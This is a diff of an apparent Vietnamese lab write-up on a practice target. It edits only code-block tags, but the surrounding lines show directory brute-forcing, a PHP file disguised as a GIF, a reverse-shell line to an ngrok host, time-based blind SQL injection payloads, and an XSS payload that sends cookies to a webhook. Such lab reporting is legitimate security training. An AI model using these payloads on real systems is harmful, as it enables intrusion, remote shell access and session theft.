@@ -52,7 +52,7 @@ File `backup.zip` chứa toàn bộ mã nguồn đã bị lưu trữ công khai 
 ### Step to reproduce 
 
 Đầu tiên, ta sử dụng công cụ `dirsearch` với lệnh:
-```bash=
+```bash
 python dirsearch.py -u https://upload.koinbase.cyberjutsu-lab.tech/
 ```
 
@@ -134,7 +134,7 @@ Nghĩa là tất cả các thư mục con trong `/var/www/`, bao gồm cả `/va
 ### Step to reproduce 
 
 Đầu tiên, mình sẽ tạo 1 file `shell.php` với nội dung như sau:
-```bash=
+```bash
 GIF89a
 <?php phpinfo(); ?>
 ```
@@ -160,7 +160,7 @@ Cuối cùng, ta truy cập vào `upload/4762991e1201cbcb.php` trên host `https
 
 Khi đã biết thư mục `upload` cho phép thực thi mã `PHP`, ta có thể tạo một tệp giả mạo hình ảnh (ví dụ `.gif`) nhưng thực chất chứa mã độc để thiết lập `reverse shell`.
 
-```bash=php
+```bash php
 GIF89a
 <?php system('bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/YOUR_PORT 0>&1"'); ?>
 ```
@@ -257,7 +257,7 @@ Và trong endpoint này được truyền qua tham số `id` cũng thông qua h�
 ### Step to reproduce 
 
 Đầu tiên, ta sẽ truyền thử payload: 
-```bash=
+```SQL
 id=0 OR 1=1-- a
 ```
 ![image](https://hackmd.io/_uploads/rkSM1tyblg.png)
@@ -267,7 +267,7 @@ Kết quả vẫn trả ra thông tin của admin nghĩa nó đã thực hiện 
 Sau khi thử nhiều payload thì nhận định đây SQLi Time Base Delay.
 
 Payload tiếp theo ta truyền là: 
-```bash=mysql
+```SQL
 id=0 OR SLEEP(10)-- a
 ```
 ![image](https://hackmd.io/_uploads/Skr-eFyWxl.png)
@@ -276,7 +276,7 @@ Từ đây mình có thể viết script để có thể xác định tên datab
 
 Payload đầu tiên sẽ là: 
 
-```bash=
+```SQL
 OR IF((SELECT ASCII(SUBSTRING(database(),{i},1))>{mid}),SLEEP(1),0)
 ```
 Kỹ thuật ta sử dụng kỹ thuật **Blind SQL Injection (Time-based)** kết hợp với **Binary Search** để khai thác lỗ hổng. 
@@ -358,7 +358,7 @@ Ban đầu, webhook không có request nào gửi ra.
 
 Và sau đó, mình tạo ra 1 thẻ `<img>` như sau:
 
-```bash=
+```bash
 <img src=x onerror="new Image().src=`<url_webhook>?c=`%2Bdocument.cookie">
 ```
 
